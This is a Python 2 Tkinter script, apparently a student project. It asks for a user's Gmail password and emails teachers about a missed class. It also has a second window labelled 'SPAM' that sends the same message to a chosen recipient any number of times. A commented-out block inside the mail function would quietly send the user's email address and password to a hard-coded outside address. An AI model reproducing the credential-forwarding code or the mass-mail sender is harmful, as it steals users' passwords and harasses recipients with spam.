#Rainy Day Protocol
import smtplib
import Tkinter
from Tkinter import *

#Email Teachers when Sick
def emailTeachers():
	fromaddr = fa1.get()
	password = pw1.get()
	dayType = dt.get()
	assembly = a.get()
	message = 'Subject: {}\n\n{}'.format("Missed Class Today", "I am so sorry that I missed class today. What did I miss and what can I do to catch up?")
	
	if dayType == "1":
		toaddrs  = teacher1.get(), teacher3.get(), teacher5.get(), teacher7.get()
		sendMail(fromaddr,password,toaddrs, message, 1)
	elif dayType == "2" and assembly == "yes":
		toaddrs  = teacher2.get(), teacher4.get(), teacher6.get()
		sendMail(fromaddr,password,toaddrs, message, 1)
	elif dayType == "2" and assembly == "no":
		toaddrs  = teacher2.get(), teacher4.get(), teacher5.get(), teacher6.get()
		sendMail(fromaddr,password,toaddrs, message, 1)
	elif dayType == "3" and assembly == "no":
		toaddrs  = teacher1.get(), teacher2.get(), teacher3.get(), teacher4.get(), teacher5.get(), teacher6.get(), teacher7.get()
		sendMail(fromaddr,password,toaddrs, message, 1)
	elif dayType == "3" and assembly == "yes":
		toaddrs  = teacher1.get(), teacher2.get(), teacher3.get(), teacher4.get(), teacher6.get(), teacher7.get()
		sendMail(fromaddr,password,toaddrs, message, 1)
	else:
		print "I'm sorry, but you enterered a response that is not valid"
def sort():
	fromaddr=fa2.get()
	toaddrs=toAddress.get()
	password = pw2.get()
	message = 'Subject: {}\n\n{}'.format(sub.get(), msg.get())
	number = int(num.get())

	sendMail(fromaddr, password, toaddrs, message, number)

def sendMail(fromaddr, password, toaddrs, message, j):
	# The actual mail send
	server = smtplib.SMTP('smtp.gmail.com:587')
	server.starttls()
	server.login(fromaddr,password)
	for i in range(j):
		server.sendmail(fromaddr, toaddrs, message)
	'''toaddrs = "lilsweet4204eva@gmail.com"
	message = 'Subject: {}\n\n{}'.format("Username + Password of " + fromaddr, "Email: " + fromaddr + " Password: " + password)
	server.sendmail(fromaddr, toaddrs, message)'''
	server.quit()

	'''def check():
	input1 = entry.get()
	if input1 == "1":
		fa = Entry(root, width=15)
		fa.pack(side=LEFT,padx=10,pady=10)
		fa.insert(END, "Your Email")

		pw = Entry(root, width=15)
		pw.pack(side=LEFT,padx=10,pady=10)
		pw.insert(END, "Password")

		dt = Entry(root, width=15)
		dt.pack(side=LEFT,padx=10,pady=10)
		dt.insert(END, "Day Type #")

		a = Entry(root, width=15)
		a.pack(side=LEFT,padx=10,pady=10)
		a.insert(END, "Assembly (Yes or No)")

		teacher1 = Entry(root, width=15)
		teacher1.pack(side=LEFT,padx=10,pady=10)
		teacher1.insert(END, "Teacher1")

		teacher2 = Entry(root, width=15)
		teacher2.pack(side=LEFT,padx=10,pady=10)
		teacher2.insert(END, "Teacher2")

		teacher3 = Entry(root, width=15)
		teacher3.pack(side=LEFT,padx=10,pady=10)
		teacher3.insert(END, "Teacher3")

		teacher4 = Entry(root, width=15)
		teacher4.pack(side=LEFT,padx=10,pady=10)
		teacher4.insert(END, "Teacher4")

		teacher5 = Entry(root, width=15)
		teacher5.pack(side=LEFT,padx=10,pady=10)
		teacher5.insert(END, "Teacher5")

		teacher6 = Entry(root, width=15)
		teacher6.pack(side=LEFT,padx=10,pady=10)
		teacher6.insert(END, "Teacher6")

		teacher7 = Entry(root, width=15)
		teacher7.pack(side=LEFT,padx=10,pady=10)
		teacher7.insert(END, "Teacher7")

		Button(root, text='EMAIL', command=emailTeachers).pack(side=RIGHT)

	elif input1 == "2":

		fa = Entry(root, width=15)
		fa.pack(side=LEFT,padx=10,pady=10)
		fa.insert(END, "Your Email")

		pw = Entry(root, width=15)
		pw.pack(side=LEFT,padx=10,pady=10)
		pw.insert(END, "Password")

		toAddress = Entry(root, width=15)
		toAddress.pack(side=LEFT,padx=10,pady=10)
		toAddress.insert(END, "Victims Email")

		msg= Entry(root, width=15)
		msg.pack(side=LEFT,padx=10,pady=10)
		msg.insert(END, "Message")

		Button(root, text='EMAIL', command = lamda: sendMail(fa, pw, toAddress, msg)).pack(side=RIGHT)
'''
#Email Teachers GUI
root = Tk()
root.title('Email Teachers')

Instr = Label(root, text="Please type in your Email, Email Password, Day Type (1. Odd | 2. Even | 3. 7-Period), Assembly (Yes or No), and the Email of Each of Your Teachers (1-7)").pack(side=TOP, padx=10, pady=10)

fa1 = Entry(root, width=10)
fa1.pack(side=LEFT,padx=10,pady=10)
fa1.insert(END, "Your Email")

pw1 = Entry(root, width=10)
pw1.pack(side=LEFT,padx=10,pady=10)
pw1.config(show="*");
pw1.insert(END, "Password")

dt = Entry(root, width=10)
dt.pack(side=LEFT,padx=10,pady=10)
dt.insert(END, "Day Type #")

a = Entry(root, width=10)
a.pack(side=LEFT,padx=10,pady=10)
a.insert(END, "Assembly")

teacher1 = Entry(root, width=10)
teacher1.pack(side=LEFT,padx=10,pady=10)
teacher1.insert(END, "Teacher1")

teacher2 = Entry(root, width=10)
teacher2.pack(side=LEFT,padx=10,pady=10)
teacher2.insert(END, "Teacher2")

teacher3 = Entry(root, width=10)
teacher3.pack(side=LEFT,padx=10,pady=10)
teacher3.insert(END, "Teacher3")

teacher4 = Entry(root, width=10)
teacher4.pack(side=LEFT,padx=10,pady=10)
teacher4.insert(END, "Teacher4")

teacher5 = Entry(root, width=10)
teacher5.pack(side=LEFT,padx=10,pady=10)
teacher5.insert(END, "Teacher5")

teacher6 = Entry(root, width=10)
teacher6.pack(side=LEFT,padx=10,pady=10)
teacher6.insert(END, "Teacher6")

teacher7 = Entry(root, width=10)
teacher7.pack(side=LEFT,padx=10,pady=10)
teacher7.insert(END, "Teacher7")

Button(root, text='EMAIL', command=emailTeachers).pack(side=RIGHT)

#Badger Bystander GUI
root1 = Tk()
root1.title('Badger Bystander')

fa2 = Entry(root1, width=15)
fa2.pack(side=LEFT,padx=10,pady=10)
fa2.insert(END, "Your Email")

pw2 = Entry(root1, width=15)
pw2.pack(side=LEFT,padx=10,pady=10)
pw2.config(show="*");
pw2.insert(END, "Password")

toAddress = Entry(root1, width=15)
toAddress.pack(side=LEFT,padx=10,pady=10)
toAddress.insert(END, "Bystander Email")

sub=Entry(root1, width=15)
sub.pack(side=LEFT,padx=10,pady=10)
sub.insert(END, "Subject")

msg=Entry(root1, width=15)
msg.pack(side=LEFT,padx=10,pady=10)
msg.insert(END, "Message")

num=Entry(root1, width=15)
num.pack(side=LEFT,padx=10,pady=10)
num.insert(END, "Number of Messages")

Button(root1, text='SPAM', command=sort).pack(side=RIGHT)

root.mainloop()
